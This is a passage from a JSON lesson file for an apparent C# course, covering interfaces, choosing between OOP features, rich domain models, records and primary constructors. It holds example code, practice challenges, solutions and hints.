              "code": "// INTERFACE definition\ninterface IDrawable\n{\n    void Draw();  // No implementation!\n    void Erase();\n}\n\ninterface IResizable\n{\n    void Resize(int width, int height);\n}\n\n// Class implementing ONE interface\nclass Button : IDrawable\n{\n    public void Draw()\n    {\n        Console.WriteLine(\"Drawing button\");\n    }\n    \n    public void Erase()\n    {\n        Console.WriteLine(\"Erasing button\");\n    }\n}\n\n// Class implementing MULTIPLE interfaces\nclass Image : IDrawable, IResizable\n{\n    public void Draw()\n    {\n        Console.WriteLine(\"Drawing image\");\n    }\n    \n    public void Erase()\n    {\n        Console.WriteLine(\"Erasing image\");\n    }\n    \n    public void Resize(int width, int height)\n    {\n        Console.WriteLine(\"Resizing to \" + width + \"x\" + height);\n    }\n}\n\n// Polymorphism with interfaces\nIDrawable[] drawable = { new Button(), new Image() };\nforeach (IDrawable item in drawable)\n{\n    item.Draw();  // Each draws differently!\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`interface IInterfaceName`**: Interfaces use 'interface' keyword. By convention, names start with 'I'. Define WHAT, not HOW.\n\n**`void Method();`**: Interface methods have NO body, NO access modifiers (implicitly public). Just signatures ending with semicolon.\n\n**`class C : IDrawable, IResizable`**: Class can implement MULTIPLE interfaces! Separate with commas. Must implement ALL methods from ALL interfaces.\n\n**`Interface vs Abstract Class`**: Interface = pure contract (no implementation). Abstract = template with some implementation. Can implement many interfaces, inherit from one class."
            },
            {
              "type": "WARNING",
              "title": "Important Considerations",
              "content": "## Default Interface Methods (C# 8+)\n\nStarting with C# 8, interfaces CAN have default implementations! This was added to evolve interfaces without breaking existing implementers.\n\n```csharp\ninterface ILogger\n{\n    void Log(string message);\n    \n    // DEFAULT implementation - classes don't HAVE to override\n    void LogError(string error) => Log($\"ERROR: {error}\");\n}\n```\n\n**Key gotchas with default interface methods:**\n- Default methods are NOT inherited by the class! You must cast to the interface to call them: `((ILogger)myClass).LogError(\"oops\")`\n- They work best for ADDING new methods to existing interfaces without breaking implementers\n- Don't overuse them - they can make code harder to understand\n- Structs and default interface methods don't mix well (boxing occurs)\n\n**When to use default interface methods:**\n- Evolving library interfaces without breaking changes\n- Providing sensible defaults that most implementers won't need to override\n- NOT for complex logic - keep interfaces focused on contracts!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-07-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a media player system with interfaces!\n\n1. INTERFACE 'IPlayable':\n   - void Play()\n   - void Pause()\n   - void Stop()\n\n2. INTERFACE 'IRecordable':\n   - void Record()\n   - void SaveRecording()\n\n3. CLASS 'VideoPlayer' implements IPlayable\n4. CLASS 'AudioRecorder' implements IPlayable AND IRecordable\n5. Create objects, call methods polymorphically",
              "starterCode": "interface IPlayable\n{\n    // Define methods\n}\n\ninterface IRecordable\n{\n    // Define methods\n}\n\nclass VideoPlayer : IPlayable\n{\n    // Implement IPlayable\n}\n\nclass AudioRecorder : IPlayable, IRecordable\n{\n    // Implement both interfaces\n}",
              "solution": "interface IPlayable\n{\n    void Play();\n    void Pause();\n    void Stop();\n}\n\ninterface IRecordable\n{\n    void Record();\n    void SaveRecording();\n}\n\nclass VideoPlayer : IPlayable\n{\n    public void Play()\n    {\n        Console.WriteLine(\"Playing video\");\n    }\n    \n    public void Pause()\n    {\n        Console.WriteLine(\"Video paused\");\n    }\n    \n    public void Stop()\n    {\n        Console.WriteLine(\"Video stopped\");\n    }\n}\n\nclass AudioRecorder : IPlayable, IRecordable\n{\n    public void Play()\n    {\n        Console.WriteLine(\"Playing audio\");\n    }\n    \n    public void Pause()\n    {\n        Console.WriteLine(\"Audio paused\");\n    }\n    \n    public void Stop()\n    {\n        Console.WriteLine(\"Audio stopped\");\n    }\n    \n    public void Record()\n    {\n        Console.WriteLine(\"Recording audio\");\n    }\n    \n    public void SaveRecording()\n    {\n        Console.WriteLine(\"Saving recording\");\n    }\n}\n\nIPlayable player = new VideoPlayer();\nplayer.Play();\n\nAudioRecorder recorder = new AudioRecorder();\nrecorder.Play();\nrecorder.Record();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Playing\"",
                  "expectedOutput": "Playing",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Recording\"",
                  "expectedOutput": "Recording",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Interface: 'interface IName { void Method(); }'. Implement: 'class C : IName { public void Method() { } }'. Must implement ALL interface methods!"
                },
                {
                  "level": 2,
                  "text": "Adding implementation in interface: 'void Method() { code }' in interface is WRONG! Interfaces have NO implementation (except default interface methods in C# 8+, advanced topic)."
                },
                {
                  "level": 3,
                  "text": "Forgetting 'public' in implementation: When implementing interface methods in class, you MUST make them 'public'! Interface members are implicitly public."
                },
                {
                  "level": 4,
                  "text": "Not implementing all methods: If interface has 3 methods, class MUST implement all 3! Missing even one = compiler error."
                },
                {
                  "level": 5,
                  "text": "Using 'new' instead of 'implements': C# uses ':' for BOTH inheritance and interfaces. 'class C : IDrawable' implements the interface (colon, not 'implements' keyword)."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Adding implementation in interface",
                  "consequence": "'void Method() { code }' in interface is WRONG! Interfaces have NO implementation (except default interface methods in C# 8+, advanced topic).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting 'public' in implementation",
                  "consequence": "When implementing interface methods in class, you MUST make them 'public'! Interface members are implicitly public.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not implementing all methods",
                  "consequence": "If interface has 3 methods, class MUST implement all 3! Missing even one = compiler error.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using 'new' instead of 'implements'",
                  "consequence": "C# uses ':' for BOTH inheritance and interfaces. 'class C : IDrawable' implements the interface (colon, not 'implements' keyword).",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-07-05",
          "title": "When to Use Each OOP Feature",
          "moduleId": "module-07",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "You've learned many OOP tools! But WHEN do you use each one? Think of it like a toolbox:\n\n🔧 **INHERITANCE**: Use when there's an 'IS-A' relationship. Dog IS-A Animal, Car IS-A Vehicle. Share common features.\n\n🎨 **ABSTRACT CLASSES**: Use when you want to provide SOME implementation but force derived classes to complete it. Template pattern.\n\n📋 **INTERFACES**: Use when you want to define a CONTRACT without implementation. Multiple classes can implement same interface even if completely unrelated.\n\n🔄 **POLYMORPHISM**: Use when you want different classes to respond to the same method call differently. Shape.Draw() draws differently for Circle vs Rectangle.\n\nRule of thumb:\n• Inheritance: Share CODE (implementation)\n• Interfaces: Share CONTRACT (what must be done)\n• Abstract: Share BOTH (some code + force completion)"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// Example: Game character system\n\n// INTERFACE - contract for anything that can attack\ninterface IAttacker\n{\n    void Attack();\n    int GetDamage();\n}\n\n// ABSTRACT CLASS - template for all characters\nabstract class Character\n{\n    public string Name;\n    public int Health = 100;\n    \n    // Concrete method (shared by all)\n    public void TakeDamage(int damage)\n    {\n        Health -= damage;\n        Console.WriteLine(Name + \" took \" + damage + \" damage. Health: \" + Health);\n    }\n    \n    // Abstract method (each character moves differently)\n    public abstract void Move();\n}\n\n// DERIVED CLASS implementing abstract and interface\nclass Warrior : Character, IAttacker\n{\n    public int WeaponDamage = 20;\n    \n    public override void Move()\n    {\n        Console.WriteLine(Name + \" marches forward\");\n    }\n    \n    public void Attack()\n    {\n        Console.WriteLine(Name + \" swings sword!\");\n    }\n    \n    public int GetDamage()\n    {\n        return WeaponDamage;\n    }\n}\n\nclass Mage : Character, IAttacker\n{\n    public int SpellPower = 30;\n    \n    public override void Move()\n    {\n        Console.WriteLine(Name + \" teleports\");\n    }\n    \n    public void Attack()\n    {\n        Console.WriteLine(Name + \" casts fireball!\");\n    }\n    \n    public int GetDamage()\n    {\n        return SpellPower;\n    }\n}\n\n// Polymorphism in action\nCharacter[] party = { new Warrior { Name = \"Thor\" }, new Mage { Name = \"Gandalf\" } };\nforeach (Character c in party)\n{\n    c.Move();  // Each moves differently!\n}\n\nIAttacker[] attackers = { new Warrior(), new Mage() };\nforeach (IAttacker a in attackers)\n{\n    a.Attack();  // Each attacks differently!\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`Decision Tree: Inheritance`**: Use inheritance when: 1) Classes have IS-A relationship, 2) Want to share implementation, 3) Have clear hierarchy. Avoid deep inheritance (3+ levels gets complex).\n\n**`Decision Tree: Abstract Class`**: Use abstract when: 1) Some methods don't make sense in base class, 2) Want to provide SOME shared code, 3) Force derived classes to implement certain methods.\n\n**`Decision Tree: Interface`**: Use interface when: 1) Define behavior contract, 2) No shared implementation needed, 3) Want multiple 'capabilities' (IDrawable, IResizable, ISaveable).\n\n**`Composition vs Inheritance`**: Sometimes COMPOSITION (has-a) is better than INHERITANCE (is-a)! Car HAS-A Engine (composition) is better than Car IS-A Engine (wrong!)."
            },
            {
              "type": "WARNING",
              "title": "Important Considerations",
              "content": "## The 'sealed' Keyword - Preventing Inheritance\n\nSometimes you DON'T want a class to be inherited! Use `sealed` to prevent it:\n\n```csharp\nsealed class FinalImplementation\n{\n    // No class can inherit from this!\n}\n\nclass Animal { public virtual void Speak() { } }\nclass Dog : Animal\n{\n    // sealed on a method prevents FURTHER overriding\n    public sealed override void Speak() { Console.WriteLine(\"Woof\"); }\n}\nclass Poodle : Dog\n{\n    // ERROR! Can't override sealed method\n    // public override void Speak() { } \n}\n```\n\n**When to use sealed:**\n- Security-sensitive classes that shouldn't be extended\n- Performance optimization (sealed classes can be slightly faster)\n- When inheritance would break your class's invariants\n- Framework/library classes where extension isn't intended\n\n**Favor Composition Over Inheritance:**\nInstead of: `class Car : Vehicle, Engine, Transmission` (impossible in C#!)\nDo: `class Car { Vehicle type; Engine engine; Transmission trans; }` (composition)\n\nComposition is more flexible - you can swap components at runtime!"
            },
            {
              "type": "ARCHITECTURE",
              "title": "Domain-Driven Design Principles",
              "content": "## Rich vs Anemic Domain Models\n\nWhen building real-world applications like ShopFlow, how you model your domain entities matters significantly. There are two main approaches to consider.\n\n**Anemic Domain Model (Avoid)**\n\nAn anemic domain model is essentially a data container with public setters and no business logic. While it seems simpler, it leads to scattered validation and broken invariants:\n\n```csharp\n// ANEMIC - Avoid this pattern!\npublic class Product\n{\n    public string Name { get; set; }  // Anyone can set invalid name\n    public decimal Price { get; set; }  // Could be set to negative!\n    public int Stock { get; set; }  // No protection against invalid values\n}\n\n// Business logic ends up scattered everywhere\nproduct.Stock = product.Stock - quantity;  // What if Stock goes negative?\n```\n\n**Rich Domain Model (Prefer)**\n\nA rich domain model encapsulates behavior alongside data. Private setters and behavior methods protect your business rules:\n\n```csharp\n// RICH - ShopFlow's recommended pattern\npublic class Product\n{\n    public string Name { get; private set; }\n    public decimal Price { get; private set; }\n    public int Stock { get; private set; }\n\n    public Product(string name, decimal price, int initialStock)\n    {\n        if (string.IsNullOrWhiteSpace(name))\n            throw new ArgumentException(\"Product name is required\");\n        if (price <= 0)\n            throw new ArgumentException(\"Price must be positive\");\n        if (initialStock < 0)\n            throw new ArgumentException(\"Stock cannot be negative\");\n\n        Name = name;\n        Price = price;\n        Stock = initialStock;\n    }\n\n    public void RemoveStock(int quantity)\n    {\n        if (quantity <= 0)\n            throw new ArgumentException(\"Quantity must be positive\");\n        if (Stock - quantity < 0)\n            throw new InvalidOperationException(\"Insufficient stock\");\n        Stock -= quantity;\n    }\n\n    public void AddStock(int quantity)\n    {\n        if (quantity <= 0)\n            throw new ArgumentException(\"Quantity must be positive\");\n        Stock += quantity;\n    }\n}\n```\n\n## Encapsulation Guards Invariants\n\nEncapsulation is not just about hiding data - it protects your business rules. In ShopFlow, we have invariants that must NEVER be violated:\n\n- Stock can never go negative\n- Order total must equal sum of line items\n- Product price must be positive\n- Customer email must be valid format\n\nBy making setters private and exposing behavior methods, the class itself enforces these rules. No external code can put the object into an invalid state.\n\n## Entity vs Value Object\n\nDomain-Driven Design distinguishes between two types of domain objects:\n\n**Entities (Have Identity)**\n\nEntities are defined by their unique identity, not their attributes. Two products with identical names and prices are still different products if they have different IDs. In ShopFlow:\n\n- Product (identified by ProductId)\n- Order (identified by OrderId)\n- Customer (identified by CustomerId)\n- ShoppingCart (identified by CartId)\n\n**Value Objects (Defined by Values)**\n\nValue objects have no identity - they are defined entirely by their attribute values. Two value objects with the same values are considered equal and interchangeable. In ShopFlow:\n\n```csharp\n// Value Object - immutable, equality by value\npublic record Money(decimal Amount, string Currency)\n{\n    public Money Add(Money other)\n    {\n        if (Currency != other.Currency)\n            throw new InvalidOperationException(\"Cannot add different currencies\");\n        return new Money(Amount + other.Amount, Currency);\n    }\n}\n\npublic record Address(string Street, string City, string PostalCode, string Country);\n\npublic record OrderLineItem(Guid ProductId, string ProductName, int Quantity, Money UnitPrice)\n{\n    public Money Total => new Money(UnitPrice.Amount * Quantity, UnitPrice.Currency);\n}\n```\n\nValue objects are naturally implemented as C# records because records provide value-based equality by default. This makes comparing addresses or money amounts intuitive and correct.\n\n## ShopFlow Domain Model Summary\n\nIn the ShopFlow e-commerce application, we apply these principles consistently:\n\n- **Product**: Entity with private setters, behavior methods for stock management\n- **Order**: Entity with line items, calculates totals, enforces order state transitions\n- **Money**: Value object for currency-safe price calculations\n- **Address**: Value object for shipping and billing addresses\n- **Customer**: Entity with validation on email and profile updates\n\nBy following rich domain model principles, ShopFlow's code is more maintainable, bugs are caught early through validation, and business rules are documented in code rather than scattered across the application."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-07-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Design a zoo system using all OOP concepts!\n\n1. INTERFACE 'IFeedable': void Feed()\n2. ABSTRACT CLASS 'Animal': string Name, int Age, abstract void MakeSound()\n3. DERIVED 'Lion' : Animal, IFeedable: override MakeSound() to 'Roar!', implement Feed()\n4. DERIVED 'Penguin' : Animal, IFeedable: override MakeSound() to 'Squawk!', implement Feed()\n5. Create array of Animals, call MakeSound() polymorphically\n6. Create array of IFeedable, call Feed() on all\n\nDemonstrate: inheritance, abstraction, interfaces, polymorphism!",
              "starterCode": "interface IFeedable\n{\n    void Feed();\n}\n\nabstract class Animal\n{\n    public string Name;\n    public int Age;\n    \n    public abstract void MakeSound();\n}\n\n// Implement Lion and Penguin\n\n// Create arrays and demonstrate polymorphism",
              "solution": "interface IFeedable\n{\n    void Feed();\n}\n\nabstract class Animal\n{\n    public string Name;\n    public int Age;\n    \n    public abstract void MakeSound();\n    \n    public void DisplayInfo()\n    {\n        Console.WriteLine(Name + \", age \" + Age);\n    }\n}\n\nclass Lion : Animal, IFeedable\n{\n    public override void MakeSound()\n    {\n        Console.WriteLine(\"Roar!\");\n    }\n    \n    public void Feed()\n    {\n        Console.WriteLine(\"Feeding \" + Name + \" meat\");\n    }\n}\n\nclass Penguin : Animal, IFeedable\n{\n    public override void MakeSound()\n    {\n        Console.WriteLine(\"Squawk!\");\n    }\n    \n    public void Feed()\n    {\n        Console.WriteLine(\"Feeding \" + Name + \" fish\");\n    }\n}\n\nAnimal[] animals = { \n    new Lion { Name = \"Simba\", Age = 5 },\n    new Penguin { Name = \"Pingu\", Age = 2 }\n};\n\nforeach (Animal a in animals)\n{\n    a.DisplayInfo();\n    a.MakeSound();\n}\n\nIFeedable[] feedables = { new Lion(), new Penguin() };\nforeach (IFeedable f in feedables)\n{\n    f.Feed();\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Roar\"",
                  "expectedOutput": "Roar",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Squawk\"",
                  "expectedOutput": "Squawk",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Feeding\"",
                  "expectedOutput": "Feeding",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Combine concepts: abstract class for shared template, interface for behavior contract, override for polymorphism. Use base type arrays for polymorphic operations."
                },
                {
                  "level": 2,
                  "text": "Overusing inheritance: Don't create deep hierarchies (Animal → Mammal → Carnivore → Feline → Lion). Keep it simple! 2-3 levels max."
                },
                {
                  "level": 3,
                  "text": "Interface vs Abstract confusion: If NO shared implementation, use interface. If SOME shared code, use abstract class. Both? Use abstract class with interfaces!"
                },
                {
                  "level": 4,
                  "text": "Forgetting polymorphism benefit: The power is storing different types in same array (Animal[]) and calling methods. Each object responds differently!"
                },
                {
                  "level": 5,
                  "text": "Inheritance for code reuse only: Don't inherit just to reuse code! Use composition (has-a) or helper classes instead. Inherit when there's true IS-A relationship."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Overusing inheritance",
                  "consequence": "Don't create deep hierarchies (Animal → Mammal → Carnivore → Feline → Lion). Keep it simple! 2-3 levels max.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Interface vs Abstract confusion",
                  "consequence": "If NO shared implementation, use interface. If SOME shared code, use abstract class. Both? Use abstract class with interfaces!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting polymorphism benefit",
                  "consequence": "The power is storing different types in same array (Animal[]) and calling methods. Each object responds differently!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Inheritance for code reuse only",
                  "consequence": "Don't inherit just to reuse code! Use composition (has-a) or helper classes instead. Inherit when there's true IS-A relationship.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-07-06",
          "title": "Records (C# 9+)",
          "moduleId": "module-07",
          "order": 6,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're filling out a government form. Once you write your name, address, and birthdate, you don't want anyone changing it - it's your official record!\n\nThat's what RECORDS are in C# - special classes designed to hold DATA that shouldn't change. They're perfect for:\n\n- Data transfer objects (DTOs)\n- Configuration values\n- API responses\n- Anything that represents 'facts' rather than 'things that do stuff'\n\nRecords give you:\n- Immutability by default (data can't change after creation)\n- Value-based equality (two records with same data are 'equal')\n- Automatic ToString(), Equals(), and GetHashCode()\n- Compact one-line syntax!\n\nThink of a class as a person (can change clothes, mood, etc.) vs a record as a passport (fixed facts about a person)."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// Traditional class - lots of boilerplate!\nclass PersonClass\n{\n    public string Name { get; set; }\n    public int Age { get; set; }\n    \n    public PersonClass(string name, int age)\n    {\n        Name = name;\n        Age = age;\n    }\n}\n\n// RECORD - one line does it all! (C# 9+)\npublic record Person(string Name, int Age);\n\n// Usage\nvar person1 = new Person(\"Alice\", 30);\nvar person2 = new Person(\"Alice\", 30);\n\n// Value-based equality - same data = equal!\nConsole.WriteLine(person1 == person2);  // True!\n\n// Automatic ToString()\nConsole.WriteLine(person1);  // Person { Name = Alice, Age = 30 }\n\n// With-expressions for copying with modifications\nvar olderPerson = person1 with { Age = 31 };\nConsole.WriteLine(olderPerson);  // Person { Name = Alice, Age = 31 }\n\n// Original unchanged (immutable)\nConsole.WriteLine(person1);  // Person { Name = Alice, Age = 30 }\n\n// RECORD STRUCT (C# 10+) - value type with record features\npublic record struct Point(int X, int Y);  // Mutable!\npublic readonly record struct ImmutablePoint(int X, int Y);  // Immutable!\n\nvar p1 = new Point(10, 20);\nvar p2 = p1 with { X = 30 };  // With-expression works!\nConsole.WriteLine(p2);  // Point { X = 30, Y = 20 }\n\n// Nested records\npublic record Rectangle(Point TopLeft, Point BottomRight);\nvar rect = new Rectangle(new Point(0, 0), new Point(100, 50));",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`public record Person(string Name, int Age);`**: This ONE line creates: a class with Name and Age properties, a constructor that sets them, ToString(), Equals(), GetHashCode(), and deconstructor!\n\n**`person1 == person2`**: Unlike classes (which compare references), records compare VALUES. Two records with identical data are equal, even if they're different objects in memory.\n\n**`person1 with { Age = 31 }`**: The 'with' expression creates a COPY with some properties changed. Original stays unchanged! This is how you 'modify' immutable data.\n\n**`Positional parameters`**: The (string Name, int Age) are called positional parameters. They become init-only properties and constructor parameters automatically.\n\n**`record vs record class vs record struct`**: 'record' and 'record class' are the same (reference types). 'record struct' (C# 10+) creates a value type record."
            },
            {
              "type": "WARNING",
              "title": "Record Struct and Important Gotchas",
              "content": "## Record Struct (C# 10+)\n\nFor performance-critical code, use `record struct` - a VALUE type with record features:\n\n```csharp\n// Reference type (heap allocated)\npublic record PersonRecord(string Name, int Age);\n\n// Value type (stack allocated, better for small data)\npublic record struct Point(int X, int Y);\n\n// Immutable value type (best of both worlds!)\npublic readonly record struct ImmutablePoint(int X, int Y);\n```\n\n**Key differences:**\n- `record` / `record class`: Reference type, properties are init-only (immutable)\n- `record struct`: Value type, properties are MUTABLE by default!\n- `readonly record struct`: Value type, properties are immutable\n\n**With expressions work on all record types:**\n```csharp\nvar p1 = new Point(10, 20);\nvar p2 = p1 with { X = 30 };  // Works! p2 = Point { X = 30, Y = 20 }\n```\n\n**When NOT to use records:**\n- Entity Framework entities (EF needs reference equality)\n- Classes with complex mutable state\n- When you need inheritance hierarchies (records support inheritance but it gets complex)\n\n**Use records for:** DTOs, configuration, API responses, value objects, anything that represents 'data' rather than 'behavior'."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-07-06-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a simple product catalog using records!\n\n1. Create a record 'Product' with: string Name, decimal Price, string Category\n2. Create 3 products: 'Laptop' ($999.99, 'Electronics'), 'Coffee' ($12.99, 'Food'), 'Book' ($24.99, 'Books')\n3. Display all products using their automatic ToString()\n4. Create a discounted version of Laptop with price $899.99 using 'with'\n5. Compare two identical products to show value equality",
              "starterCode": "// Define the Product record\n\n// Create products\n\n// Display products\n\n// Create discounted laptop using 'with'\n\n// Compare two identical products",
              "solution": "// Define the Product record\npublic record Product(string Name, decimal Price, string Category);\n\n// Create products\nvar laptop = new Product(\"Laptop\", 999.99m, \"Electronics\");\nvar coffee = new Product(\"Coffee\", 12.99m, \"Food\");\nvar book = new Product(\"Book\", 24.99m, \"Books\");\n\n// Display products\nConsole.WriteLine(laptop);\nConsole.WriteLine(coffee);\nConsole.WriteLine(book);\n\n// Create discounted laptop using 'with'\nvar discountedLaptop = laptop with { Price = 899.99m };\nConsole.WriteLine(\"Discounted: \" + discountedLaptop);\n\n// Compare two identical products\nvar anotherCoffee = new Product(\"Coffee\", 12.99m, \"Food\");\nConsole.WriteLine(\"Are they equal? \" + (coffee == anotherCoffee));  // True!",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain 'Laptop'",
                  "expectedOutput": "Laptop",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain 'Discounted'",
                  "expectedOutput": "Discounted",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain 'True'",
                  "expectedOutput": "True",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use 'public record Product(string Name, decimal Price, string Category);' for the one-line definition. Use 'm' suffix for decimal literals (999.99m)."
                },
                {
                  "level": 2,
                  "text": "For 'with' expressions, syntax is: var newRecord = oldRecord with { Property = newValue };. Original remains unchanged!"
                },
                {
                  "level": 3,
                  "text": "Records use value equality by default. Two records with identical property values are equal (==), unlike regular classes."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Trying to modify record properties directly",
                  "consequence": "Record properties are init-only by default. Use 'with' expressions to create modified copies instead of trying to change properties.",
                  "correction": "Use: var updated = original with { Property = newValue };"
                },
                {
                  "mistake": "Forgetting decimal suffix 'm'",
                  "consequence": "Decimal literals need the 'm' suffix (999.99m). Without it, C# treats them as double and causes type mismatch errors.",
                  "correction": "Always use 'm' suffix for decimal values: 12.99m, 999.99m"
                },
                {
                  "mistake": "Expecting reference equality",
                  "consequence": "Records compare by VALUE, not reference. Two separate record objects with same data are equal (==).",
                  "correction": "Understand that records are designed for value semantics - same data means equal."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-07-07",
          "title": "Primary Constructors (C# 12)",
          "moduleId": "module-07",
          "order": 7,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine filling out a form for a new employee. The old way: create a blank form, THEN write name, THEN write department, THEN write salary. Tedious!\n\nThe new way: a smart form that asks for everything upfront and fills itself in!\n\nThat's PRIMARY CONSTRUCTORS in C# 12. Instead of:\n1. Declaring fields\n2. Writing a constructor\n3. Assigning each parameter to each field\n\nYou just put parameters right after the class name - and they're available throughout the class!\n\nBefore: 15 lines of boilerplate code\nAfter: 1 line with parameters in the class declaration\n\nThis is a HUGE productivity boost for classes that need initial data. Less typing, fewer bugs, cleaner code!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// OLD WAY - lots of boilerplate!\nclass PersonOld\n{\n    private readonly string _name;\n    private readonly int _age;\n    \n    public PersonOld(string name, int age)\n    {\n        _name = name;\n        _age = age;\n    }\n    \n    public void Introduce()\n    {\n        Console.WriteLine($\"Hi, I'm {_name}, {_age} years old.\");\n    }\n}\n\n// NEW WAY - Primary Constructor (C# 12)!\npublic class Person(string name, int age)\n{\n    // Parameters are available everywhere in the class!\n    public void Introduce()\n    {\n        Console.WriteLine($\"Hi, I'm {name}, {age} years old.\");\n    }\n    \n    public string GetName() => name;\n    public int GetAge() => age;\n}\n\n// Usage - same as before!\nvar person = new Person(\"Alice\", 30);\nperson.Introduce();  // Hi, I'm Alice, 30 years old.\n\n// Works with inheritance too!\npublic class Employee(string name, int age, string department) \n    : Person(name, age)  // Pass to base class\n{\n    public void ShowDepartment()\n    {\n        Console.WriteLine($\"{name} works in {department}\");\n    }\n}\n\nvar emp = new Employee(\"Bob\", 25, \"Engineering\");\nemp.Introduce();        // From Person\nemp.ShowDepartment();   // Bob works in Engineering",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`public class Person(string name, int age)`**: Parameters go right after the class name in parentheses. No need to declare fields or write constructor body!\n\n**`Parameters are captured`**: The parameters (name, age) are available in ALL instance members - methods, properties, initializers. They act like private fields.\n\n**`: Person(name, age)`**: In derived classes, pass primary constructor parameters to base class constructor using this syntax after the class declaration.\n\n**`No required fields`**: Parameters are captured but NOT automatically properties. If you need a public property, you still declare it: `public string Name { get; } = name;`\n\n**`Validation`**: You can still validate by using the parameters in field initializers: `private readonly string _name = name ?? throw new ArgumentNullException(nameof(name));`"
            },
            {
              "type": "WARNING",
              "title": "Critical Best Practices",
              "content": "## Primary Constructor Parameters Are NOT Readonly!\n\nUnlike record primary constructors, CLASS primary constructor parameters can be reassigned! This is a common source of bugs:\n\n```csharp\npublic class Counter(int initialCount)\n{\n    public void Increment()\n    {\n        initialCount++;  // This WORKS but is often a mistake!\n    }\n    \n    public int Count => initialCount;  // Returns modified value\n}\n```\n\n**Best Practice: Capture to readonly fields for dependency injection:**\n```csharp\npublic class UserService(ILogger logger, IUserRepository repo)\n{\n    // Capture to readonly fields immediately!\n    private readonly ILogger _logger = logger;\n    private readonly IUserRepository _repo = repo;\n    \n    public void CreateUser(User user)\n    {\n        _logger.Log(\"Creating user\");  // Use the field, not the parameter\n        _repo.Add(user);\n    }\n}\n```\n\n**Why this matters:**\n- Prevents accidental reassignment\n- Compiler can warn if you use parameter instead of field\n- Makes intent clear: these are dependencies, not mutable state\n\n**All other constructors must chain to primary:**\n```csharp\npublic class Person(string name, int age)\n{\n    // Additional constructor MUST call primary via 'this()'\n    public Person(string name) : this(name, 0) { }\n}\n```"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-07-07-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a vehicle tracking system using primary constructors!\n\n1. Create a class 'Vehicle' with primary constructor: (string make, string model, int year)\n2. Add a method GetInfo() that returns a formatted string like 'Year Make Model'\n3. Create a derived class 'Car' with primary constructor: (string make, string model, int year, int doors)\n4. Pass make, model, year to base class Vehicle\n5. Add a method Describe() that uses GetInfo() and adds door count\n6. Create instances and test both classes",
              "starterCode": "// Create Vehicle with primary constructor\n\n// Create Car that inherits from Vehicle\n\n// Test your classes",
